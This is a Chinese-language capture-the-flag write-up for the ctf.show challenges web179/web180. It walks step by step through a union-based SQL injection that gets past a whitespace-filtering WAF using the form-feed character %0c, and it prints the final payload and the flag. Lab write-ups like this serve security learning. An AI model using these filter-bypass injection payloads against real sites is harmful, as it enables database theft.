### 📝 题目信息

- **题目名称**：web179、web180
- **题目序号**：9/150
- **题目提示**：使用sqlmap是没有灵魂的
- **题目链接**：http://dafca0e3-8888-4240-9a3a-c07f57f1b1a2.challenge.ctf.show/

### 🔍 源码审计

**查询语句：**

```php
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```



**过滤函数：**

```php
function waf($str){
   //代码过于简单，不宜展示
}
```

**结论：** ✅ 存在WAF，且过滤规则比web178更严格

### 🧪 注入过程

#### 第1步：测试web178的payload

```sql
999'union%0bselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3
```

**结果：** ❌ 无数据返回
**结论：** `%0b`（垂直制表符）被加入黑名单

#### 第2步：测试空格

```sql
999'union select'1',(select`password`from`ctfshow_user`where`username`='flag'),'3
```

**结果：** ❌ 无数据返回
**结论：** 空格仍被过滤

#### 第3步：测试异常情况

```sql
999'union1select'1',(select`password`from`ctfshow_user`where`username`='flag'),'3
```

**结果：** ⚠️ 数据接口请求异常：parsererror
**结论：** 这种写法破坏了SQL语法，导致解析错误

#### 第4步：测试换行符%0a

```sql
999'union%0aselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3
```

**结果：** ❌ 无数据返回
**结论：** `%0a` 也被过滤

#### 第5步：测试制表符%09

```sql
999'union%09select'1',(select`password`from`ctfshow_user`where`username`='flag'),'3
```

**结果：** ❌ 无数据返回
**结论：** `%09` 也被过滤

#### 第6步：测试换页符%0c

```sql
999'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3
```

**结果：** ✅ **成功获取flag**

### 🏁 最终结果

**成功获取flag：**

```bash
ctfshow{d1b1aec8-1122-492d-b075-4d0ad45d8468}
```

**最终payload：**

```bash
999'union%0cselect'1',
(select`password`from`ctfshow_user`where`username`='flag'),
'3
```

### 💡 知识点总结

| 知识点          | 说明                                                 |
| :-------------- | :--------------------------------------------------- |
| **换页符**      | `%0c`，URL编码后的特殊空白字符，Form Feed            |
| **WAF逐级加强** | 每道题过滤的字符越来越多，需要不断尝试新的替代符     |
| **系统化测试**  | 从最常用到最生僻的空白字符依次测试，直到找到漏网之鱼 |